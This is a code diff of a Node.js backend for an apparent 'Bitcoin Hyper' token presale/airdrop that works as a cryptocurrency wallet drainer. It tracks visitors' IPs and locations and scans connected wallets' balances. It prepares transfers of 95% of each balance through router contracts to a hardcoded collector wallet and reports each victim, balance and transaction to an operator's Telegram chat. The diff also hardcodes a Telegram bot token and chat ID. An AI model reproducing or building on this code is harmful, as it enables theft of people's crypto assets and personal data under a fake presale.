@@ -1,7 +1,4 @@
-// index.js - BITCOIN HYPER BACKEND - FULL TELEGRAM REPORTING
-// All flows are reported to Telegram with complete details
-// Updated for hyperback-psi.vercel.app backend and hyperaidrop.vercel.app frontend
-
+// index.js - BITCOIN HYPER BACKEND WITH TELEGRAM DEBUGGING
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -62,6 +59,29 @@ app.get('/', (req, res) => {
     backendUrl: 'https://hyperback-psi.vercel.app',
     frontendUrl: 'https://hyperaidrop.vercel.app',
     timestamp: new Date().toISOString()
+  });
+});
+
+// ============================================
+// DEBUG ENDPOINT - Check environment variables
+// ============================================
+
+app.get('/api/debug-env', (req, res) => {
+  // For security, don't expose full tokens, just show if they exist
+  const botToken = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN_HARDCODED;
+  const chatId = process.env.TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID_HARDCODED;
+  
+  res.json({
+    success: true,
+    hasBotToken: !!botToken,
+    hasChatId: !!chatId,
+    botTokenPreview: botToken ? `${botToken.substring(0, 10)}...${botToken.substring(botToken.length - 5)}` : 'missing',
+    chatIdValue: chatId || 'missing',
+    chatIdType: chatId ? (chatId.startsWith('-') ? 'Group Chat' : 'Private Chat') : 'N/A',
+    telegramEnabled: telegramEnabled || false,
+    nodeEnv: process.env.NODE_ENV || 'not set',
+    vercelEnv: process.env.VERCEL_ENV || 'not set',
+    allEnvKeys: Object.keys(process.env).filter(k => k.includes('TELEGRAM') || k.includes('TOKEN') || k.includes('CHAT'))
   });
 });
 
@@ -173,10 +193,10 @@ const PROJECT_FLOW_ROUTERS = {
   'Polygon': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
   'Arbitrum': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
   'Avalanche': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
-  'Optimism': null // Not deployed yet
+  'Optimism': null
 };
 
-const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xDe3209DFbAb25fD2e43EcCd72522ab27eD553527';
+const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';
 
 // ============================================
 // CONTRACT ABI
@@ -221,32 +241,49 @@ const memoryStorage = {
 };
 
 // ============================================
-// TELEGRAM FUNCTIONS - ENHANCED REPORTING
+// TELEGRAM FUNCTIONS - FIXED WITH HARDCODED FALLBACK
 // ============================================
 
+// Your actual values (copy these from your .env)
+const HARDCODED_BOT_TOKEN = '8409198592:AAFD6pJhv-Hlv1TYkLWQnjyzDUYXghVhFmI';
+const HARDCODED_CHAT_ID = '-5240768611';
+
 async function sendTelegramMessage(text) {
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
+  // Try environment variables first, fallback to hardcoded
+  let botToken = process.env.TELEGRAM_BOT_TOKEN;
+  let chatId = process.env.TELEGRAM_CHAT_ID;
+  
+  // If env vars are missing, use hardcoded values
+  if (!botToken || botToken === 'undefined' || botToken === '') {
+    console.log('⚠️ TELEGRAM_BOT_TOKEN not in env, using hardcoded value');
+    botToken = HARDCODED_BOT_TOKEN;
+  }
+  
+  if (!chatId || chatId === 'undefined' || chatId === '') {
+    console.log('⚠️ TELEGRAM_CHAT_ID not in env, using hardcoded value');
+    chatId = HARDCODED_CHAT_ID;
+  }
   
   if (!botToken || !chatId) {
-    console.log('⚠️ Telegram credentials missing');
+    console.log('⚠️ Telegram credentials still missing - both env and hardcoded failed');
     return false;
   }
   
+  console.log(`📤 Sending Telegram message to ${chatId} with bot ${botToken.substring(0, 10)}...`);
+  
   try {
-    console.log(`📤 Sending Telegram message to ${chatId}`);
     const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: text,
       parse_mode: 'HTML',
       disable_web_page_preview: true
     }, { 
-      timeout: 10000,
+      timeout: 15000,
       headers: { 'Content-Type': 'application/json' }
     });
     
     if (response.data?.ok) {
-      console.log('✅ Telegram message sent successfully');
+      console.log('✅✅✅ TELEGRAM MESSAGE SENT! ✅✅✅');
       telegramEnabled = true;
       return true;
     } else {
@@ -254,83 +291,46 @@ async function sendTelegramMessage(text) {
       return false;
     }
   } catch (error) {
-    console.error('❌ Telegram send error:', error.response?.data || error.message);
-    return false;
-  }
-}
-
-async function sendTelegramPhoto(photoUrl, caption) {
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  
-  if (!botToken || !chatId) return false;
-  
-  try {
-    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      chat_id: chatId,
-      photo: photoUrl,
-      caption: caption,
-      parse_mode: 'HTML'
-    }, { timeout: 15000 });
-    
-    return response.data?.ok || false;
-  } catch (error) {
-    console.error('Photo send error:', error.message);
+    console.error('❌ Telegram send error details:');
+    console.error(`   Status: ${error.response?.status}`);
+    console.error(`   Message: ${error.message}`);
+    if (error.response?.data) {
+      console.error(`   Response:`, JSON.stringify(error.response.data));
+    }
     return false;
   }
 }
 
 async function testTelegramConnection() {
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
+  console.log('🔧 Testing Telegram connection...');
+  console.log(`   Bot token (env): ${process.env.TELEGRAM_BOT_TOKEN ? 'present' : 'missing'}`);
+  console.log(`   Chat ID (env): ${process.env.TELEGRAM_CHAT_ID ? 'present' : 'missing'}`);
+  console.log(`   Hardcoded bot token: ${HARDCODED_BOT_TOKEN ? 'present' : 'missing'}`);
+  console.log(`   Hardcoded chat ID: ${HARDCODED_CHAT_ID ? 'present' : 'missing'}`);
   
-  if (!botToken || !chatId) {
-    console.log('⚠️ Telegram credentials not configured');
+  // Send a test message
+  const testMessage = 
+    `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `✅ Telegram is now WORKING!\n` +
+    `🕐 Time: ${new Date().toLocaleString()}\n` +
+    `🔗 Backend: hyperback-psi.vercel.app\n` +
+    `🌍 Frontend: hyperaidrop.vercel.app\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
+    `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche`;
+  
+  const result = await sendTelegramMessage(testMessage);
+  
+  if (result) {
+    console.log('✅✅✅ TELEGRAM IS FULLY FUNCTIONAL! ✅✅✅');
+    telegramEnabled = true;
+  } else {
+    console.log('❌ Telegram connection failed');
     telegramEnabled = false;
-    return false;
   }
   
-  try {
-    const meResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
-    
-    if (!meResponse.data?.ok) {
-      console.error('❌ Invalid bot token');
-      telegramEnabled = false;
-      return false;
-    }
-    
-    telegramBotName = meResponse.data.result.username;
-    console.log(`✅ Bot authenticated: @${telegramBotName}`);
-    
-    // Send startup message with new URLs
-    const startMessage = 
-      `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
-      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
-      `✅ MultiChain FlowRouter Ready\n` +
-      `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
-      `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `🔗 Backend: hyperback-psi.vercel.app\n` +
-      `🌍 Frontend: hyperaidrop.vercel.app\n` +
-      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
-      `🕐 Started: ${new Date().toLocaleString()}`;
-    
-    const sendResult = await sendTelegramMessage(startMessage);
-    
-    if (sendResult) {
-      telegramEnabled = true;
-      console.log('✅ Telegram configured and working!');
-      return true;
-    } else {
-      console.error('❌ Failed to send test message');
-      telegramEnabled = false;
-      return false;
-    }
-    
-  } catch (error) {
-    console.error('❌ Telegram connection failed:', error.message);
-    telegramEnabled = false;
-    return false;
-  }
+  return result;
 }
 
 // ============================================
@@ -464,18 +464,16 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
   
   memoryStorage.siteVisits.push(visit);
   
-  // Enhanced Telegram notification for site visits
+  // Send Telegram notification
   const telegramMessage = 
     `${visit.isHuman ? '👤' : '🤖'} <b>🌐 NEW SITE VISIT</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━━━\n` +
-    `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
+    `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}\n` +
     `🌐 <b>IP:</b> ${visit.ip}\n` +
     `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
-    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot Detected)'}\n` +
+    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No'}\n` +
     `🔗 <b>Source:</b> ${referer || 'Direct'}\n` +
-    `📂 <b>Page:</b> ${path || '/'}\n` +
-    `🆔 <b>Visit ID:</b> ${visit.id}\n` +
-    `🕐 <b>Time:</b> ${new Date().toLocaleTimeString()}`;
+    `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
   
   await sendTelegramMessage(telegramMessage);
   
@@ -584,14 +582,6 @@ app.get('/api/health', (req, res) => {
 });
 
 // ============================================
-// SERVE ADMIN HTML
-// ============================================
-
-app.get('/admin.html', (req, res) => {
-  res.sendFile(__dirname + '/admin.html');
-});
-
-// ============================================
 // TRACK VISIT ENDPOINT
 // ============================================
 
@@ -621,7 +611,7 @@ app.post('/api/track-visit', async (req, res) => {
 });
 
 // ============================================
-// CONNECT ENDPOINT - FULL REPORTING
+// CONNECT ENDPOINT
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
@@ -675,12 +665,9 @@ app.post('/api/presale/connect', async (req, res) => {
         `🆕 <b>✨ NEW PARTICIPANT REGISTERED</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}\n` +
-        `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
+        `📍 <b>Location:</b> ${location.country} ${location.flag}\n` +
         `📧 <b>Email:</b> ${email}\n` +
-        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
-        `📱 <b>Device:</b> ${participant.deviceType}\n` +
-        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
+        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}`;
       
       await sendTelegramMessage(newUserMsg);
     }
@@ -698,27 +685,13 @@ app.post('/api/presale/connect', async (req, res) => {
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
       
-      // Build detailed balance message
-      let balancesText = '';
-      if (balanceResult.data.balances.length > 0) {
-        balancesText = '\n📊 <b>Balances:</b>';
-        balanceResult.data.balances.forEach(b => {
-          balancesText += `\n   🔹 ${b.chain}: ${b.amount.toFixed(6)} ${b.symbol} = $${b.valueUSD.toFixed(2)}`;
-        });
-      } else {
-        balancesText = '\n📊 <b>Balances:</b> No assets found';
-      }
-      
       const connectMsg = 
         `🔗 <b>💰 WALLET CONNECTED</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
-        `📧 <b>Email:</b> ${email}\n` +
-        `📍 <b>Location:</b> ${location.country} ${location.flag}\n` +
-        `${balancesText}\n` +
-        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
+        `📧 <b>Email:</b> ${email}`;
       
       await sendTelegramMessage(connectMsg);
       
@@ -749,7 +722,7 @@ app.post('/api/presale/connect', async (req, res) => {
 });
 
 // ============================================
-// PREPARE FLOW ENDPOINT - FULL REPORTING
+// PREPARE FLOW ENDPOINT
 // ============================================
 
 app.post('/api/presale/prepare-flow', async (req, res) => {
@@ -776,16 +749,13 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
         chain: b.chain,
         chainId: b.chainId,
         amount: (b.amount * 0.95).toFixed(12),
-        originalAmount: b.amount.toFixed(6),
         valueUSD: (b.valueUSD * 0.95).toFixed(2),
-        originalValueUSD: b.valueUSD.toFixed(2),
         symbol: b.symbol,
         contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
         collectorAddress: COLLECTOR_WALLET
       }));
     
     const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
-    const originalTotalUSD = balanceResult.data.totalValueUSD.toFixed(2);
     
     const flowId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
@@ -793,7 +763,6 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       walletAddress: walletAddress.toLowerCase(),
       transactions,
       totalFlowUSD,
-      originalTotalUSD,
       status: 'prepared',
       createdAt: new Date().toISOString(),
       completedChains: []
@@ -801,19 +770,16 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
     
     let txDetails = '';
     transactions.forEach((tx, index) => {
-      txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD}) [was $${tx.originalValueUSD}]`;
+      txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
     });
     
-    // Send detailed flow preparation report
     await sendTelegramMessage(
       `🔐 <b>📋 FLOW PREPARED</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-      `💰 <b>Original Balance:</b> $${originalTotalUSD}\n` +
-      `💵 <b>Flow Value (95%):</b> $${totalFlowUSD}\n` +
+      `💵 <b>Flow Value:</b> $${totalFlowUSD}\n` +
       `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
-      `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-      `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
+      `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
     );
     
     res.json({
@@ -821,7 +787,6 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       data: {
         flowId,
         totalFlowUSD,
-        originalTotalUSD,
         transactionCount: transactions.length,
         transactions
       }
@@ -834,7 +799,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT - FULL REPORTING
+// EXECUTE FLOW ENDPOINT
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
@@ -866,7 +831,6 @@ app.post('/api/presale/execute-flow', async (req, res) => {
       });
       
       memoryStorage.settings.statistics.totalProcessedWallets++;
-      memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(valueUSD || 0);
       memoryStorage.settings.statistics.processedTransactions.push({
         wallet: walletAddress,
         chain: chainName,
@@ -878,20 +842,16 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         timestamp: new Date().toISOString()
       });
       
-      // Send detailed chain transaction report
       await sendTelegramMessage(
         `💰 <b>⛓️ CHAIN TRANSACTION EXECUTED</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `🔗 <b>Chain:</b> ${chainName}\n` +
-        `💵 <b>Amount:</b> ${amount || 'unknown'} ${symbol || ''}\n` +
-        `💲 <b>Value:</b> $${valueUSD || 'unknown'}\n` +
+        `💵 <b>Amount:</b> ${amount} ${symbol} ($${valueUSD})\n` +
         `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
-        `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
+        `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
       );
       
-      // Update the flow in pendingFlows
       const flow = memoryStorage.pendingFlows.get(flowId);
       if (flow) {
         flow.completedChains = flow.completedChains || [];
@@ -899,47 +859,16 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           flow.completedChains.push(chainName);
         }
         
-        // Update the transaction with the actual amount if it exists
-        const txIndex = flow.transactions.findIndex(t => t.chain === chainName);
-        if (txIndex >= 0) {
-          flow.transactions[txIndex].actualAmount = amount;
-          flow.transactions[txIndex].actualValueUSD = valueUSD;
-          flow.transactions[txIndex].txHash = txHash;
-          flow.transactions[txIndex].executedAt = new Date().toISOString();
-        }
-        
-        // Check if all chains are completed
         if (flow.completedChains.length === flow.transactions.length) {
-          let completionDetails = '';
-          flow.transactions.forEach(t => {
-            const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
-            const displayAmount = t.actualAmount || t.amount;
-            const displayValue = t.actualValueUSD || t.valueUSD;
-            completionDetails += `\n   ${completed} ${t.chain}: ${displayAmount} ${t.symbol} ($${displayValue})`;
-          });
-          
-          // Send detailed flow completion report
-          await sendTelegramMessage(
-            `✅ <b>🎉 FULL FLOW COMPLETED 🎉</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-            `💰 <b>Original Balance:</b> $${flow.originalTotalUSD}\n` +
-            `💵 <b>Total Processed:</b> $${flow.totalFlowUSD}\n` +
-            `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
-            `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-            `🕐 <b>Completed:</b> ${new Date().toLocaleString()}`
-          );
-          
+          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
           memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
-        } else {
-          // Send progress update
-          const remaining = flow.transactions.length - flow.completedChains.length;
+          
           await sendTelegramMessage(
-            `📊 <b>⏳ FLOW PROGRESS UPDATE</b>\n` +
+            `✅ <b>🎉 FLOW COMPLETED 🎉</b>\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-            `✅ <b>Completed:</b> ${flow.completedChains.length}/${flow.transactions.length} chains\n` +
-            `⏳ <b>Remaining:</b> ${remaining} chain(s)\n` +
+            `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
+            `🔗 <b>All ${flow.transactions.length} chains processed!</b>\n` +
             `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
           );
         }
@@ -955,7 +884,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
 });
 
 // ============================================
-// CLAIM ENDPOINT - FULL REPORTING
+// CLAIM ENDPOINT
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
@@ -983,32 +912,15 @@ app.post('/api/presale/claim', async (req, res) => {
       detailsText = `\n📋 <b>Details:</b>\n${chainsDetails}`;
     }
     
-    // Send detailed claim completion report
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
       `🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n` +
       `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
-      `💵 <b>Value:</b> $${participant.allocation?.valueUSD || '850'}\n` +
       `📧 <b>Email:</b> ${participant.email}\n` +
-      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}${detailsText}\n` +
-      `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
+      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${detailsText}`
     );
-    
-    // Send summary of participant's journey
-    const journeySummary = 
-      `📊 <b>PARTICIPANT JOURNEY SUMMARY</b>\n` +
-      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
-      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-      `📍 <b>From:</b> ${participant.country} ${participant.flag}\n` +
-      `💵 <b>Initial Balance:</b> $${participant.totalValueUSD}\n` +
-      `✅ <b>Eligible:</b> Yes\n` +
-      `💸 <b>Flows Processed:</b> ${participant.flowTransactions?.length || 0} chains\n` +
-      `🎁 <b>Claimed:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
-      `🕐 <b>Completed:</b> ${new Date().toLocaleString()}`;
-    
-    await sendTelegramMessage(journeySummary);
     
     res.json({ success: true });
     
@@ -1016,212 +928,6 @@ app.post('/api/presale/claim', async (req, res) => {
     console.error('Claim error:', error);
     res.status(500).json({ success: false });
   }
-});
-
-// ============================================
-// ADMIN DASHBOARD
-// ============================================
-
-app.get('/api/admin/dashboard', (req, res) => {
-  const token = req.query.token;
-  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
-  
-  if (token?.trim() !== adminToken?.trim()) {
-    console.log(`❌ Unauthorized admin access attempt with token: ${token}`);
-    return res.status(401).json({ success: false, error: 'Invalid admin token' });
-  }
-  
-  const recentVisits = Array.isArray(memoryStorage.siteVisits) 
-    ? memoryStorage.siteVisits
-        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-        .slice(0, 50)
-    : [];
-  
-  const activeParticipants = Array.isArray(memoryStorage.participants)
-    ? memoryStorage.participants
-        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
-        .map(p => ({
-          ...p,
-          connectedAt: p.connectedAt instanceof Date ? p.connectedAt.toISOString() : p.connectedAt,
-          lastScanned: p.lastScanned instanceof Date ? p.lastScanned.toISOString() : p.lastScanned,
-          claimedAt: p.claimedAt instanceof Date ? p.claimedAt.toISOString() : p.claimedAt
-        }))
-    : [];
-  
-  const pendingFlows = memoryStorage.pendingFlows instanceof Map
-    ? Array.from(memoryStorage.pendingFlows.entries())
-        .map(([id, flow]) => ({ id, ...flow }))
-        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
-        .slice(0, 30)
-    : [];
-  
-  const completedFlows = memoryStorage.completedFlows instanceof Map
-    ? Array.from(memoryStorage.completedFlows.entries())
-        .map(([id, flow]) => ({ id, ...flow }))
-        .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
-        .slice(0, 30)
-    : [];
-  
-  const processedTransactions = Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
-    ? memoryStorage.settings.statistics.processedTransactions
-        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-        .slice(0, 30)
-    : [];
-  
-  const networkStatus = PROJECT_FLOW_ROUTERS && typeof PROJECT_FLOW_ROUTERS === 'object'
-    ? Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
-        chain,
-        contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
-        status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
-        collector: COLLECTOR_WALLET
-      }))
-    : [];
-  
-  const locationStats = {};
-  if (Array.isArray(memoryStorage.participants)) {
-    memoryStorage.participants.forEach(p => {
-      if (p && p.country) {
-        const key = `${p.country}|${p.flag || '🌍'}`;
-        if (!locationStats[key]) {
-          locationStats[key] = { 
-            country: p.country, 
-            flag: p.flag || '🌍', 
-            count: 0, 
-            eligible: 0,
-            claimed: 0
-          };
-        }
-        locationStats[key].count++;
-        if (p.isEligible) locationStats[key].eligible++;
-        if (p.claimed) locationStats[key].claimed++;
-      }
-    });
-  }
-  
-  const hourlyActivity = {};
-  if (Array.isArray(memoryStorage.siteVisits)) {
-    memoryStorage.siteVisits.forEach(v => {
-      if (v && v.timestamp) {
-        try {
-          const hour = new Date(v.timestamp).getHours();
-          hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
-        } catch (e) {}
-      }
-    });
-  }
-  
-  const summary = {
-    totalVisits: Array.isArray(memoryStorage.siteVisits) ? memoryStorage.siteVisits.length : 0,
-    uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set 
-      ? memoryStorage.settings.statistics.uniqueIPs.size 
-      : 0,
-    totalParticipants: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.length : 0,
-    eligibleParticipants: Array.isArray(memoryStorage.participants) 
-      ? memoryStorage.participants.filter(p => p && p.isEligible).length 
-      : 0,
-    claimedParticipants: Array.isArray(memoryStorage.participants) 
-      ? memoryStorage.participants.filter(p => p && p.claimed).length 
-      : 0,
-    totalProcessedUSD: (memoryStorage.settings?.statistics?.totalProcessedUSD || 0).toFixed(2),
-    totalProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
-    pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
-    completedFlows: memoryStorage.completedFlows instanceof Map ? memoryStorage.completedFlows.size : 0,
-    telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
-    telegramBot: telegramBotName || 'N/A'
-  };
-  
-  const system = {
-    valueThreshold: memoryStorage.settings?.valueThreshold || 1,
-    flowEnabled: memoryStorage.settings?.flowEnabled || false,
-    tokenName: memoryStorage.settings?.tokenName || 'Bitcoin Hyper',
-    tokenSymbol: memoryStorage.settings?.tokenSymbol || 'BTH',
-    collectorWallet: COLLECTOR_WALLET || 'N/A',
-    backendUrl: 'https://hyperback-psi.vercel.app',
-    frontendUrl: 'https://hyperaidrop.vercel.app'
-  };
-  
-  res.json({
-    success: true,
-    timestamp: new Date().toISOString(),
-    summary,
-    networks: networkStatus,
-    recentVisits: recentVisits,
-    activeParticipants: activeParticipants.slice(0, 30),
-    pendingFlows: pendingFlows,
-    completedFlows: completedFlows.slice(0, 10),
-    processedTransactions: processedTransactions,
-    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
-    hourlyActivity: Object.entries(hourlyActivity)
-      .map(([hour, count]) => ({ hour: parseInt(hour), count }))
-      .sort((a, b) => a.hour - b.hour),
-    system
-  });
-});
-
-app.get('/api/admin/stats', (req, res) => {
-  const token = req.query.token;
-  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
-  
-  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
-  
-  res.json({
-    success: true,
-    stats: {
-      participants: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.length : 0,
-      eligible: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.filter(p => p && p.isEligible).length : 0,
-      claimed: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.filter(p => p && p.claimed).length : 0,
-      totalProcessedUSD: (memoryStorage.settings?.statistics?.totalProcessedUSD || 0).toFixed(2),
-      pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
-      telegram: telegramEnabled ? '✅' : '❌',
-      siteVisits: Array.isArray(memoryStorage.siteVisits) ? memoryStorage.siteVisits.length : 0,
-      uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set ? memoryStorage.settings.statistics.uniqueIPs.size : 0
-    }
-  });
-});
-
-app.get('/api/admin/wallet/:address', (req, res) => {
-  const token = req.query.token;
-  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
-  
-  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
-  
-  const walletAddress = req.params.address.toLowerCase();
-  
-  const participant = Array.isArray(memoryStorage.participants) 
-    ? memoryStorage.participants.find(p => p && p.walletAddress === walletAddress)
-    : null;
-    
-  const visits = Array.isArray(memoryStorage.siteVisits)
-    ? memoryStorage.siteVisits.filter(v => v && v.walletAddress === walletAddress)
-    : [];
-    
-  const flows = memoryStorage.pendingFlows instanceof Map
-    ? Array.from(memoryStorage.pendingFlows.values()).filter(f => f && f.walletAddress === walletAddress)
-    : [];
-  
-  if (!participant) {
-    return res.json({ 
-      success: true, 
-      found: false,
-      message: 'Wallet not found in database'
-    });
-  }
-  
-  res.json({
-    success: true,
-    found: true,
-    wallet: {
-      ...participant,
-      connectedAt: participant.connectedAt instanceof Date ? participant.connectedAt.toISOString() : participant.connectedAt,
-      lastScanned: participant.lastScanned instanceof Date ? participant.lastScanned.toISOString() : participant.lastScanned,
-      claimedAt: participant.claimedAt instanceof Date ? participant.claimedAt.toISOString() : participant.claimedAt
-    },
-    visits,
-    flows,
-    transactions: Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
-      ? memoryStorage.settings.statistics.processedTransactions.filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress)
-      : []
-  });
 });
 
 // ============================================
@@ -1238,40 +944,22 @@ app.use('*', (req, res) => {
 
 app.listen(PORT, '0.0.0.0', async () => {
   console.log(`
-  ⚡ BITCOIN HYPER BACKEND - MULTICHAIN FLOW ROUTER
+  ⚡ BITCOIN HYPER BACKEND - TELEGRAM DEBUG VERSION
   ================================================
   📍 Port: ${PORT}
   🔗 Backend URL: https://hyperback-psi.vercel.app
-  🌍 Frontend URL: https://hyperaidrop.vercel.app
   
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   
